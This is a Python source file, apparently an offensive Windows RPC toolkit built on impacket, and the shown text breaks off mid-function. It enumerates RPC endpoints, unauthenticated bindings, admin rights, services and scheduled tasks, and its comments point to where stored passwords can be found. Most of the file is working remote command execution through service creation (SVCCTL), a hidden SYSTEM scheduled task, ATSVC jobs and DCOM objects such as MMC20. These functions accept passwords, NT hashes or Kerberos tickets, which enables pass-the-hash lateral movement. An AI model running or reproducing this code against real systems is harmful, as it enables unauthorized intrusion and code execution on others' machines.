#!/usr/bin/python3

##########################################################
#                     Dependencies                       #
##########################################################

# PROTOCOL IMPLEMENTATION = RPC
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5 import rpcrt
from impacket.dcerpc.v5.ndr import NULL
DCERPCSessionError = None

# ADDITIONAL PROTOCOLS = LDAP/Errors
from Utils.LDAP import LDAPUtil
from Utils.Errors import ErrorsUtil

# Others
import time, sys, re, binascii, datetime, base64, traceback, threading, socket, ssl, os, requests, random
from enum import Enum
from io import StringIO
from struct import pack
from http.server import BaseHTTPRequestHandler, HTTPServer

##################################################
#                     UUID                       #
##################################################

def stringverToBin(s):
    (maj, min) = s.split('.')
    return pack('<H', int(maj)) + pack('<H', int(min))

def UUIDStringToBin(uuid):
	 # If a UUID is in the 00000000000000000000000000000000 format, let's return bytes as is
    if '-' not in uuid:
        return binascii.unhexlify(uuid)

    # If a UUID is in the 00000000-0000-0000-0000-000000000000 format, parse it as Variant 2 UUID
    # The first three components of the UUID are little-endian, and the last two are big-endian
    matches = re.match(r"([\dA-Fa-f]{8})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})([\dA-Fa-f]{8})", uuid)
    (uuid1, uuid2, uuid3, uuid4, uuid5, uuid6) = [int(x, 16) for x in matches.groups()]
    uuid = pack('<LHH', uuid1, uuid2, uuid3)
    uuid += pack('>HHL', uuid4, uuid5, uuid6)
    return uuid

def UUIDTupToBin(tup):
	if len(tup) != 2:
		return
	return UUIDStringToBin(tup[0]) + stringverToBin(tup[1])

def stringToUUIDTup(s):
	"""
    If version is not found in the input string: "1.0" is returned
    Example:
		"00000000-0000-0000-0000-000000000000 3.0" returns ('00000000-0000-0000-0000-000000000000','3.0')
		"10000000-2000-3000-4000-500000000000 version 3.0" returns ('00000000-0000-0000-0000-000000000000','3.0')
		"10000000-2000-3000-4000-500000000000 v 3.0" returns ('00000000-0000-0000-0000-000000000000','3.0')
		"10000000-2000-3000-4000-500000000000" returns ('00000000-0000-0000-0000-000000000000','1.0')
    """
	
	g = re.search(r"([A-Fa-f0-9]{8}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{4}-[A-Fa-f0-9]{12}).*?([0-9]{1,5}\.[0-9]{1,5})", s + " 1.0")
	if g: 
		(u, v) = g.groups()
		return u, v
	return

##################################################################
#   [MS-RPCE]-C706 = Remote Procedure Call Protocol Extensions   #
#                       Interface = EPMAPPER                     #
##################################################################

from impacket.dcerpc.v5 import epm

def listEndpoints(ip):
	###
	# Does not require authentication
	###

	print_yellow("[*] Listing endpoints")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		rpctransport = transport.DCERPCTransportFactory(r'ncacn_ip_tcp:%s' % ip)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.bind(UUIDTupToBin(('E1AF8308-5D1F-11C9-91A4-08002B14A0FA', '3.0')))

		# Query methods of the interface
		entries = []
		entry_handle = epm.ept_lookup_handle_t()
		while True:
			maybeSleep()
			request = epm.ept_lookup()
			request['inquiry_type'] = epm.RPC_C_EP_ALL_ELTS
			request['object'] = NULL
			request['Ifid'] = NULL
			request['vers_option'] = epm.RPC_C_VERS_ALL
			request['entry_handle'] = entry_handle
			request['max_ents'] = 500

			res = dce.request(request)

			for i in range(res['num_ents']):
				tmpEntry = {}
				entry = res['entries'][i]
				tmpEntry['object'] = entry['object']
				tmpEntry['annotation'] = b''.join(entry['annotation'])
				tmpEntry['tower'] = epm.EPMTower(b''.join(entry['tower']['tower_octet_string']))
				entries.append(tmpEntry)

			entry_handle = res['entry_handle']
			if entry_handle.isNull():
				break

		endpoints = {}
		# Let's groups the UUIDS
		for entry in entries:
			binding = epm.PrintStringBinding(entry['tower']['Floors'])
			tmpUUID = str(entry['tower']['Floors'][0])
			if (tmpUUID in endpoints) is not True:
				endpoints[tmpUUID] = {}
				endpoints[tmpUUID]['Bindings'] = list()
			if UUIDTupToBin(stringToUUIDTup(tmpUUID))[:18] in epm.KNOWN_UUIDS:
				endpoints[tmpUUID]['EXE'] = epm.KNOWN_UUIDS[UUIDTupToBin(stringToUUIDTup(tmpUUID))[:18]]
			else:
				endpoints[tmpUUID]['EXE'] = 'N/A'
			endpoints[tmpUUID]['annotation'] = entry['annotation'][:-1].decode('utf-8')
			endpoints[tmpUUID]['Bindings'].append(binding)

			if tmpUUID[:36] in epm.KNOWN_PROTOCOLS:
				endpoints[tmpUUID]['Protocol'] = epm.KNOWN_PROTOCOLS[tmpUUID[:36]]
			else:
				endpoints[tmpUUID]['Protocol'] = "N/A"

		first = True
		for endpoint in list(endpoints.keys()):
			if not first:
				print()
			else:
				first = False

			print("[+] Protocol: %s " % endpoints[endpoint]['Protocol'])
			print("[+] Provider: %s " % endpoints[endpoint]['EXE'])
			print("[+] UUID: %s %s" % (endpoint, endpoints[endpoint]['annotation']))
			print("[+] Bindings: ")
			for binding in endpoints[endpoint]['Bindings']:
				print("\t%s" % binding)

		return endpoints
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def searchUnauthBindings(ip):
	###
	# Does not require authentication
	###

	print_yellow("[*] Searching unauthenticated bindings")
	print_yellow("---")
	print()

	try:
		originalSTDOUT = sys.stdout
		sys.stdout = StringIO()
		try:
			endpoints = listEndpoints(ip)
		except:
			sys.stdout = originalSTDOUT
			raise
		sys.stdout = originalSTDOUT

		for endpoint in list(endpoints.keys()):
			print(f"[+] Testing {endpoint} for {endpoints[endpoint]['Protocol']}")
			unauthBinding = False
			for binding in endpoints[endpoint]['Bindings']:
				if (not binding.startswith("ncalrpc:")):
					maybeSleep()
					try:
						rpctransport = transport.DCERPCTransportFactory(binding)
						remoteName = rpctransport.getRemoteName()
						if (remoteName.startswith("\\\\")):
							rpctransport.setRemoteName(remoteName[2:])
							rpctransport.setRemoteHost(remoteName[2:])
						dce = rpctransport.get_dce_rpc()
						dce.connect()
						ifId, version = endpoint.split(" ")
						version = version[1:]
						dce.bind(UUIDTupToBin((ifId, version)))
						unauthBinding = True
						print(f"\t[+] Found unauthenticated binding: {binding}")
					except Exception as e:
						if (str(e).find("rpc_s_access_denied") != -1):
							print(f"\t[-] Access denied for binding {binding}")
						else:
							print(f"\t[-] Got error for binding {binding}: {str(e)}")
			if (unauthBinding == False):
				print("\t[-] No unauthenticated binding found")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def getOSArch(ip):
	###
	# Does not require authentication
	###

	print_yellow("[*] Getting Windows OS architecture (x86/x64)")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		rpctransport = transport.DCERPCTransportFactory(r'ncacn_ip_tcp:%s' % ip)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		NDR64Syntax = ('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0')
		try:
			dce.bind(UUIDTupToBin(('E1AF8308-5D1F-11C9-91A4-08002B14A0FA', '3.0')), transfer_syntax = NDR64Syntax)
		except Exception as e:
			if str(e).find('syntaxes_not_supported') >= 0:
				print('[+] %s is 32-bit' % ip)
			else:
				print("[-] Error: " + str(e), file = sys.stderr)
				pass
		else:
			print('[+] %s is 64-bit' % ip)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###########################################################
#   [MS-SCMR] = Service Control Manager Remote Protocol   #
#                     Interface = SVCCTL                  #
###########################################################

from impacket.dcerpc.v5 import scmr

def isAdmin(ip, user, pwd, domain, nthash, aesKey, ccache, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights
	###

	print_yellow("[*] Checking administrative rights")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('367ABB81-9844-35F1-AD32-98F038001003', '2.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		# 0xF003F - SC_MANAGER_ALL_ACCESS
		# http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
		res = scmr.hROpenSCManagerW(dce, dwDesiredAccess = 0xF003F)
		svcmHandle = res['lpScHandle']
		scmr.hRCloseServiceHandle(dce, svcmHandle)
		print("[+] Current user have administrator access")

		return True
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		if (str(e).find("rpc_s_access_denied") != -1):
			print(f"[-] Current user is not admin", file = sys.stderr)
		else:
			print(f"[-] Got error: {str(e)}", file = sys.stderr)
			print('---------------------------------', file = sys.stderr)
			traceback.print_exc()
			print('---------------------------------', file = sys.stderr)
		
		return False

def RCESVCCTL(ip, user, pwd, domain, nthash, aesKey, ccache, cmd, serviceName = "MyService", unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights
	###

	print_yellow("[*] Executing command through SVCCTL")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('367ABB81-9844-35F1-AD32-98F038001003', '2.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		SERVICENAME = serviceName + "\x00"
		res = scmr.hROpenSCManagerW(dce)
		svcmHandle = res['lpScHandle']
		if svcmHandle != 0:
			# First we try to open the service in case it exists.
			# If it does, we remove it.
			try:
				svc = scmr.hROpenServiceW(dce, svcmHandle, SERVICENAME)
			except Exception as e:
				if str(e).find('ERROR_SERVICE_DOES_NOT_EXIST') >= 0:
					pass
				else:
					raise e
			else:
				# It exists, remove it
				scmr.hRDeleteService(dce, svc['lpServiceHandle'])
				scmr.hRCloseServiceHandle(dce, svc['lpServiceHandle'])

			# Create the service
			COMMAND = 'C:\\Windows\\System32\\cmd.exe /c %s\x00' % (cmd)
			res = scmr.hRCreateServiceW(dce, svcmHandle, SERVICENAME, SERVICENAME,
										lpBinaryPathName = COMMAND, dwStartType = scmr.SERVICE_DEMAND_START)
			svcHandle = res['lpServiceHandle']
			if svcHandle != 0:
				# Start service
				try:
					scmr.hRStartServiceW(dce, svcHandle)
				except Exception as e:
					if str(e).find('ERROR_SERVICE_REQUEST_TIMEOUT') >= 0:
						# The BINARY_PATH_NAME which contain the system cmd to execute
						# Will not respond to the Service Manager as a normal service should
						# Thus, the Service Manager will raise this error But It is normal
						pass
					else:
						raise e
				# Wait service to execute and stop
				DONE = False
				while not DONE:
					res = scmr.hRQueryServiceStatus(dce, svcHandle)
					status = res['lpServiceStatus']['dwCurrentState']
					if status == scmr.SERVICE_STOPPED:
						DONE = True
					else:
						time.sleep(2)
				# Delete service
				try:
					scmr.hRDeleteService(dce, svcHandle)
				except:
					pass
				scmr.hRCloseServiceHandle(dce, svcHandle)
			scmr.hRCloseServiceHandle(dce, svcmHandle)

		print ("[+] Command executed")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

# TODO : Add net start/stop/pause functions

def startService(ip, user, pwd, domain, nthash, aesKey, ccache, serviceName, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights
	###

	print_yellow("[*] Starting '%s' service on remote host" % serviceName)
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('367ABB81-9844-35F1-AD32-98F038001003', '2.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		SERVICENAME = serviceName + "\x00"
		res = scmr.hROpenSCManagerW(dce)
		svcmHandle = res['lpScHandle']
		if svcmHandle == 0:
			print("[-] Failed to get handle on Service Manager", file = sys.stderr)
			return False
		else:
			svc = scmr.hROpenServiceW(dce, svcmHandle, SERVICENAME)
			svcHandle = svc['lpServiceHandle']
			res = scmr.hRQueryServiceStatus(dce, svcHandle)
			if res['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
				print("[+] Service is already running")
			elif res['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
				res = scmr.hRQueryServiceConfigW(dce, svcHandle)
				if res['lpServiceConfig']['dwStartType'] == 0x4:
					print("[+] Service is disabled. Enabling It")
					scmr.hRChangeServiceConfigW(dce, svcHandle, dwStartType = 0x3)
				scmr.hRStartServiceW(dce, svcHandle)
				time.sleep(1)
				print("[+] Service started")
			else:
				print('[-] Unknown service state 0x%x - Aborting' % res['CurrentState'])
				return False
		return True
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return False

def listServices(ip, user, pwd, domain, nthash, aesKey, ccache, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights
	# Services runned by domain users => Password stored into LSA Secrets
	###

	print_yellow("[*] Listing services on remote host")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\svcctl]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('367ABB81-9844-35F1-AD32-98F038001003', '2.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		res = scmr.hROpenSCManagerW(dce)
		svcmHandle = res['lpScHandle']
		if svcmHandle == 0:
			print("[-] Failed to get handle on Service Manager", file = sys.stderr)
			return
		else:
			res = scmr.hREnumServicesStatusW(dce, svcmHandle, dwServiceType = scmr.SERVICE_WIN32_OWN_PROCESS, dwServiceState = scmr.SERVICE_STATE_ALL)
			for i in range(len(res)):
				maybeSleep()
				try:
					svcName = res[i]['lpServiceName'][:-1]
					svc = scmr.hROpenServiceW(dce, svcmHandle, res[i]['lpServiceName'][:-1])
					svcHandle = svc['lpServiceHandle']
					svcConf = scmr.hRQueryServiceConfigW(dce, svcHandle)
					svcUser = svcConf['lpServiceConfig']['lpServiceStartName'][:-1]
					print(f"[+] Service '{svcName}' found for {svcUser}")
				except Exception as e:
					if 'rpc_s_access_denied' not in str(e):
						print("[-] Exception querying service '%s': %s" % (res[i]['lpServiceName'][:-1], str(e)), file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

############################################################
#   [MS-TSCH] = Task Scheduler Service Remoting Protocol   #
#          Interfaces = ITaskSchedulerService / ATSVC      #
############################################################

from impacket.dcerpc.v5 import tsch

def xml_escape(data):
	replace_table = {
					"&": "&amp;",
					'"': "&quot;",
					"'": "&apos;",
					">": "&gt;",
					"<": "&lt;",
					}
	return ''.join(replace_table.get(c, c) for c in data)

XML_TEMPLATE = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<Triggers>
		<CalendarTrigger>
			<StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
			<Enabled>true</Enabled>
			<ScheduleByDay>
				<DaysInterval>1</DaysInterval>
			</ScheduleByDay>
		</CalendarTrigger>
	</Triggers>
	<Principals>
		<Principal id="LocalSystem">
			<UserId>S-1-5-18</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
		<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
		<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
		<AllowHardTerminate>true</AllowHardTerminate>
		<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
		<IdleSettings>
			<StopOnIdleEnd>false</StopOnIdleEnd>
			<RestartOnIdle>false</RestartOnIdle>
		</IdleSettings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
		<RunOnlyIfIdle>false</RunOnlyIfIdle>
		<WakeToRun>false</WakeToRun>
		<ExecutionTimeLimit>P3D</ExecutionTimeLimit>
		<Priority>7</Priority>
	</Settings>
	<Actions Context="LocalSystem">
		<Exec>
			<Command>C:\Windows\System32\cmd.exe</Command>
			<Arguments>/c %s</Arguments>
		</Exec>
	</Actions>
</Task>
"""

def RCEITaskSchedulerService(ip, user, pwd, domain, nthash, aesKey, ccache, cmd, taskName = 'MyTask', unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights
	###

	print_yellow("[*] Executing command through ITaskSchedulerService")
	print_yellow("---")
	print()

	try:
		# Connect to the interface ITaskSchedulerService
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\atsvc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if not unauthBinding:
			dce.set_credentials(*rpctransport.get_credentials())
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('86D35949-83C9-4044-B424-DB363231FD0C', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		TASKNAME = '\\' + taskName
		XML = XML_TEMPLATE % (" ".join([xml_escape(x) for x in cmd.split(" ")]))
		DONE = False
		tsch.hSchRpcRegisterTask(dce, TASKNAME, XML, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
		tsch.hSchRpcRun(dce, TASKNAME)
		while not DONE:
			res = tsch.hSchRpcGetLastRunInfo(dce, TASKNAME)
			if res['pLastRuntime']['wYear'] != 0:
				DONE = True
			else:
				time.sleep(2)
		tsch.hSchRpcDelete(dce, TASKNAME)

		print ("[+] Command executed")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def listScheduledTasks(ip, user, pwd, domain, nthash, aesKey, ccache, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights
	# Scheduled Tasks with Logon Type = Password => Password stored into Vault Credential Manager
	###

	print_yellow("[*] Listing scheduled tasks on remote host")
	print_yellow("---")
	print()

	try:
		# Connect to the interface ITaskSchedulerService
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\atsvc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if not unauthBinding:
			dce.set_credentials(*rpctransport.get_credentials())
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('86D35949-83C9-4044-B424-DB363231FD0C', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface
		# Blacklisted folders (Default ones)
		blacklist = [u'Microsoft\x00']
		# Start with the root folder
		folders = ['\\']
		tasks = []
		schtaskusers = []
		# Get root folder
		res = tsch.hSchRpcEnumFolders(dce, '\\')
		for item in res['pNames']:
			data = item['Data']
			if data not in blacklist:
				folders.append('\\' + data)
		# Enumerate folders
		# Subfolders not supported yet
		for folder in folders:
			maybeSleep()
			res = tsch.hSchRpcEnumTasks(dce, folder)
			for item in res['pNames']:
				data = item['Data']
				if folder != '\\':
					# Make sure to strip the null byte
					tasks.append(folder[:-1] + '\\' + data)
				else:
					tasks.append(folder + data)
		for task in tasks:
			maybeSleep()
			res = tsch.hSchRpcRetrieveTask(dce, task)
			userInfoXML = res['pXml']
			SIDString = userInfoXML.split("<UserId>")[1].split("</UserId>")[0]
			try:
				logonType = userInfoXML.split("<LogonType>")[1].split("</LogonType>")[0]
			except:
				logonType = "<Empty>"
			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			try:
				login = SIDToName(ip, user, pwd, domain, nthash, aesKey, ccache, SIDString)
			except:
				sys.stdout = originalSTDOUT
				raise
			sys.stdout = originalSTDOUT
			print(f"[+] Scheduled task '{task}' found for {login} (Logon type = {logonType})")
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

from impacket.dcerpc.v5 import atsvc

def RCEATSVC(ip, user, pwd, domain, nthash, aesKey, ccache, cmd, pMinAfter = 1, unauthTransport = False, unauthBinding = False, alternateBinding = None, alternateInterface = None):
	###
	# Require administrative rights
	#	- Operation supported only before Windows 8 (https://learn.microsoft.com/en-us/windows/win32/taskschd/what-s-new-in-task-scheduler#windows-8)
	#	- OR If HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration\EnableAt set to 1 (according to https://posts.specterops.io/abstracting-scheduled-tasks-3b6451f6a1c5)
	###

	print_yellow("[*] Executing command through ATSVC")
	print_yellow("---")
	print()

	try:
		# Connect to the interface ATSVC
		if alternateBinding == None:
			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\pipe\atsvc]' % ip)
		else:
			rpctransport = transport.DCERPCTransportFactory(alternateBinding)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		if not unauthBinding:
			dce.set_credentials(*rpctransport.get_credentials())
		if alternateInterface == None:
			dce.bind(UUIDTupToBin(('1FF70682-0A51-30E8-076D-740BE8CEE98B', '1.0')))
		else:
			dce.bind(UUIDTupToBin(tuple(alternateInterface.split(":"))))

		# Query methods of the interface

		# Adding job to start once after <pMinAfter> minutes of current time (must correspond to target)
		# Job will delete itself after executing
		serverName = atsvc.ATSVC_HANDLE()
		serverName['Data'] = "\\%s\x00" % ip		
		AtInfo = atsvc.AT_INFO()
		now = datetime.datetime.now()
		minAfter = now + datetime.timedelta(minutes = pMinAfter)
		midnight = datetime.datetime.combine(minAfter.date(), datetime.time())
		timeDiff = minAfter - midnight
		jobTime = int(timeDiff.total_seconds() * 1000)
		AtInfo['JobTime'] = jobTime
		AtInfo['DaysOfMonth'] = 0
		AtInfo['DaysOfWeek'] = 0
		AtInfo['Flags'] = 0
		AtInfo['Command'] = "cmd.exe /c " + cmd + "\x00"
		jobID = atsvc.hNetrJobAdd(dce, serverName, AtInfo)['pJobId']
		
		print (f"[+] Job ID = {jobID} added. Command will execute at {minAfter}")

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

#############################################################################
#   [MS-DCOM] = Distributed Component Object Model (DCOM) Remote Protocol   #
#         Interface = IRemoteSCMActivator for creating COM objects          #
#############################################################################

from impacket.dcerpc.v5 import dcomrt
from impacket.dcerpc.v5.dcom import oaut

#    COM objects
#    CLSID = 9BA05972-F6A8-11CF-A442-00A0C90A8F39 for ShellWindows
#    CLSID = C08AFD90-F2A1-11D1-8455-00A0C91F3880 for ShellBrowserWindow
#    CLSID = 49B2791A-B1AE-4C90-9B8E-E860BA07F889 for MMC20
#    IID = 00020400-0000-0000-C000-000000000046 for IDispatch

def getInterface(interface, res):
	objRefType = dcomrt.OBJREF(b''.join(res))['flags']
	objRef = None
	if objRefType == dcomrt.FLAGS_OBJREF_CUSTOM:
		objRef = dcomrt.OBJREF_CUSTOM(b''.join(res))
	elif objRefType == dcomrt.FLAGS_OBJREF_HANDLER:
		objRef = dcomrt.OBJREF_HANDLER(b''.join(res))
	elif objRefType == dcomrt.FLAGS_OBJREF_STANDARD:
		objRef = dcomrt.OBJREF_STANDARD(b''.join(res))
	elif objRefType == dcomrt.FLAGS_OBJREF_EXTENDED:
		objRef = dcomrt.OBJREF_EXTENDED(b''.join(res))
	else:
		print("[-] Unknown OBJREF Type! 0x%x" % objRefType, file = sys.stderr)

	return dcomrt.IRemUnknown2(dcomrt.INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'], oxid = objRef['std']['oxid'], oid = objRef['std']['oxid'], target = interface.get_target()))

def RCEDCOM1(ip, user, pwd, domain, nthash, aesKey, ccache, cmd, comMethod = 'MMC20', unauthTransport = False, unauthBinding = False):
	###
	# Require administrative rights
	###

	# COM Method = ShellWindows/ShellBrowserWindow/MMC20

	print_yellow(f"[*] Executing command through {comMethod} COM object")
	print_yellow("---")
	print()

	try:
		# Connect to the interface
		rpctransport = transport.DCERPCTransportFactory(r'ncacn_ip_tcp:%s' % ip)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				rpctransport._doKerberos = True
				if (ccache != None):
					import os
					os.environ["KRB5CCNAME"] = ccache
			rpctransport.set_credentials(user, pwd, domain, '', nthash, aesKey)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
		if not unauthTransport:
			if (aesKey != None or ccache != None):
				dce.set_auth_type(rpcrt.RPC_C_AUTHN_GSS_NEGOTIATE)
		scm = dcomrt.IRemoteSCMActivator(dce)

		# Create COM object
		if comMethod == "ShellWindows":
			CLSID = UUIDStringToBin('9BA05972-F6A8-11CF-A442-00A0C90A8F39')
		elif comMethod == "ShellBrowserWindow":
			CLSID = UUIDStringToBin('C08AFD90-F2A1-11D1-8455-00A0C91F3880')
		else:
			CLSID = UUIDStringToBin('49B2791A-B1AE-4C90-9B8E-E860BA07F889')
		IID = UUIDStringToBin('00020400-0000-0000-C000-000000000046') # IDispatch
		iInterface = scm.RemoteCreateInstance(CLSID, IID)
		# scm.RemoteCreateInstance(CLSID, IID):
		#	 dce.bind(uuidtup_to_bin(('000001A0-0000-0000-C000-000000000046', '0.0'))) # IRemoteSCMActivator
